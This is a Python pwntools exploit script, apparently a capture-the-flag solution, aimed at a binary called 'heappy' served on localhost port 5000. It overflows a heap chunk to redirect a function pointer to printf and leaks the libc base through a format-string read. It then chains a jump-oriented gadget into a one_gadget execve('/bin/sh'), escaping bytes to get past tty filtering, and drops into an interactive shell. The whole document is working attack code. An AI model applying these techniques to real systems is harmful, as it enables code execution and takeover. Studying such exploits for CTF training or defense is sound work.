from pwn import *


def send_and_trace(r, trace, payload):
    trace += r.recv()
    r.sendline(payload)
    trace += payload + b'\n'
    return trace


def main():
    local = False
    print_trace = True
    trace = b""
    filename = "./heappy_patchelf"
    elf = ELF(filename)
    libc = ELF("./libc-2.19.so")
    context.binary = elf
    if local:
        r = process([filename])
    else:
        r = remote("localhost", 5000)
    padding = 144
    target = elf.symbols['printf'] # for leakage
    payload = b'A' * padding + p64(target)
    payload = payload[:-1] # the last null byte is added by scanf
    # choose language
    trace = send_and_trace(r, trace, b"1")
    # choose name
    trace = send_and_trace(r, trace, b"pwn")
    # change language -> allocate new chunk
    trace = send_and_trace(r, trace, b"2")
    # ita language
    trace = send_and_trace(r, trace, b"2")
    # change name
    trace = send_and_trace(r, trace, b"1")
    # overflow in functions' chunk
    trace = send_and_trace(r, trace, payload)
    # choose name again to perform format string attack
    trace = send_and_trace(r, trace, b"1")
    # for libc leak
    trace = send_and_trace(r, trace, b"%13$p")
    trace += r.recvuntil(b'0x')
    leak = r.recvline()
    trace += leak
    leak = bytes.fromhex(leak[:12].decode())[::-1]
    leak = u64(leak + b'\x00' * 2)
    libc.address = leak - 245 - libc.symbols["__libc_start_main"]
    # 0x0000000000198aec : pop rax ; xor al, 0xed ; jmp qword ptr [rdx]
    # to satisfy:
    """
    0x4647c execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    """
    move_stack_JOP_gadget = p64(libc.address + 0x0000000000198aec)
    one_gadget_RCE_constrained = p64(libc.address + 0x4647c)
    if not local:
        # need to escape chars that are filtered by tty; the escape sequence will be stripped
        tty_wrap = lambda x: b''.join([b'\x16' + i.to_bytes(1, 'little') for i in x])
        move_stack_JOP_gadget = tty_wrap(move_stack_JOP_gadget)
        one_gadget_RCE_constrained = tty_wrap(one_gadget_RCE_constrained)
    payload = one_gadget_RCE_constrained + b"A" * (padding - 8) + move_stack_JOP_gadget
    # bad chars for scanf
    bad_chars = [b'\t', b'\n', b' ']
    assert all([i not in payload for i in bad_chars])
    trace = send_and_trace(r, trace, b"1")
    trace = send_and_trace(r, trace, payload)
    if print_trace:
        print(trace.decode(errors='backslashreplace'))
    r.interactive()


if __name__ == "__main__":
    main()

    

 
